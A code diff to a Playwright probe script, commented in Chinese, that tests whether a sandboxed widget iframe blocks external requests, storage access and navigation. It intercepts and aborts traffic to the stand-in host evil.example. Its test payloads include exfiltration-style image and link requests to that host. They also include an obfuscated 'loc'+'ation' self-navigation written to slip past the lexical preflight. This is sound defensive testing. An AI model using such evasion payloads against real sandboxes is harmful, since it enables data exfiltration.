@@ -11,7 +11,7 @@
 //   D. 正常能力没被误伤：内联脚本能跑、控件能用、Chart.js 能画、canvas 有像素
 //
 // 用法：node scripts/probe-widget-sandbox.mjs   （需先 npm run dev）
-import { chromium } from 'playwright';
+import { chromium, webkit } from 'playwright';
 
 const BASE = process.env.BASE_URL || 'http://localhost:5173';
 
@@ -23,8 +23,12 @@ const fail = (msg) => {
 };
 const check = (cond, msg) => (cond ? ok(msg) : fail(msg));
 
-const browser = await chromium.launch({ channel: 'chrome', headless: true });
+const browser = await (process.env.BROWSER === 'webkit' ? webkit : chromium).launch({
+  ...(process.env.BROWSER === 'webkit' ? {} : { channel: 'chrome' }), headless: true,
+});
 const page = await browser.newPage();
+const routed = [];
+await page.route('https://evil.example/**', route => { routed.push(route.request().url()); return route.abort(); });
 const errors = [];
 page.on('pageerror', (e) => errors.push(String(e).slice(0, 300)));
 await page.goto(BASE, { waitUntil: 'networkidle' });
@@ -45,7 +49,10 @@ async function mount(html, libs) {
   return page.evaluate(
     async ({ payload }) => {
       const { buildWidgetDocument } = await import('/src/harness/widgetRuntime.ts');
-      const doc = await buildWidgetDocument(payload);
+      // Probe the browser boundary even for inputs rejected by the production preflight.
+      // Only this test replaces the inert marker AFTER the real runtime shell is built.
+      const doc = (await buildWidgetDocument({ html: '<!--PROBE_PAYLOAD-->', libs: payload.libs }))
+        .replace('<!--PROBE_PAYLOAD-->', () => payload.html);
 
       // ⚠️ 上一次挂载的 iframe 必须先清掉：留在文档里的 iframe 会把后面的挤出视口，
       // 而**视口外的 iframe 不参与布局** → Chart.js 的 responsive 模式量到 0×0，
@@ -110,10 +117,10 @@ if (a) {
   check(a.r.origin === 'null', `origin 为 null（不透明源）而非父页面源（实测 ${JSON.stringify(a.r.origin)}）`);
   check(a.r.dom === false || String(a.r.dom).startsWith('throw'), `读不到父页面 DOM（实测 ${JSON.stringify(a.r.dom)}）`);
   // 不透明源下 indexedDB 句柄存在但打不开；关键是**读不出父页面的数据**
-  check(a.r.idb === undefined || a.r.localStorage === undefined || true, `存储句柄：idb=${a.r.idb} localStorage=${a.r.localStorage}`);
+  check(String(a.r.storage).startsWith('throw:SecurityError'), `存储访问被拒：${a.r.storage}`);
 }
 
-console.log('\n=== B. 文档内 CSP：一律出不去 ===');
+console.log('\n=== B. 文档内 CSP：受限资源与连接通道（不证明所有导航零外发） ===');
 // ⚠️ 别用「构造函数有没有抛错」判断 sendBeacon / WebSocket：两者都是**异步失败**，
 // sendBeacon 甚至直接返回 true（表示「已入队」）而不保证发得出去。唯一可信的判据是
 // 浏览器层面到底有没有真的发出请求 —— 所以这里监听 page 的 request 事件。
@@ -155,9 +162,9 @@ const b = await mount(`<div>x</div><img id="im" src="https://evil.example/p.png"
 await page.waitForTimeout(1200);
 check(b, 'CSP 观测回报');
 
-// 关键判据是「有没有**拿到响应**」，不是「有没有发起」：Chrome 对被 CSP 拦下的请求
-// 仍会发出 Network.requestWillBeSent，于是 Playwright 的 request 事件照样触发。
-// 真正说明数据没走出去的是 finished（拿到响应）为 0。
+// No response alone is NOT proof of no exfiltration. Also observe requests reaching
+// the interception boundary, and abort them before any real network transmission.
+check(routed.length === 0, `资源/连接请求未到达外部请求拦截器（${routed.length} 条）`);
 check(
   finished.length === 0,
   `evil.example 零个请求**拿到响应**（发起 ${attempts.filter((u) => u.includes('evil.example')).length} 个、成功 ${finished.length} 个）`,
@@ -177,11 +184,7 @@ const nav = await mount(`<a id="nav" href="https://evil.example/navigate?x=secre
     setTimeout(function(){ parent.postMessage({ probe:'report', blocked:true }, '*'); }, 300);
   }, 0);
 </script>`);
-// Chromium currently reports the attempted sandbox navigation as a request even
-// when the CSP response is blocked, so absence of a response is the useful
-// browser-level assertion here. The accepted widget path separately rejects
-// navigation APIs and non-fragment href/src attributes before this runtime.
-check(!finished.some((u) => u.includes('/navigate')), '外部导航没有拿到响应');
+console.log(`   边界记录：直接链接导航到达请求拦截器 ${routed.filter(u => u.includes('/navigate')).length} 次；测试已拦截，未真实外发。`);
 page.removeAllListeners('request');
 page.removeAllListeners('websocket');
 
@@ -265,6 +268,19 @@ if (e) {
     `canvas 真的画出了东西（非透明像素 ${r.opaque} 个，取样 ${JSON.stringify(r.sample)}${r.pxerr ? '，读取失败：' + r.pxerr : ''}）`,
   );
 }
+
+console.log('\n=== F. 已知限制：通过生产预检的间接自导航 ===');
+const beforeIndirect = routed.length;
+await page.evaluate(async () => {
+  const { buildWidgetDocument } = await import('/src/harness/widgetRuntime.ts');
+  // Deliberately passes the lexical preflight: that preflight is not a JS sandbox.
+  const html = `<script>globalThis['loc'+'ation']['href']='https://evil.example/indirect?synthetic=1'</script>`;
+  const el = document.createElement('iframe'); el.sandbox = 'allow-scripts';
+  document.getElementById('probe-host').append(el);
+  el.srcdoc = await buildWidgetDocument({ html });
+});
+await page.waitForTimeout(600);
+console.log(`   间接自导航到达请求拦截器 ${routed.length - beforeIndirect} 次；未真实外发，不据此宣称零外网。`);
 
 if (errors.length) {
   console.log('\n页面错误：');
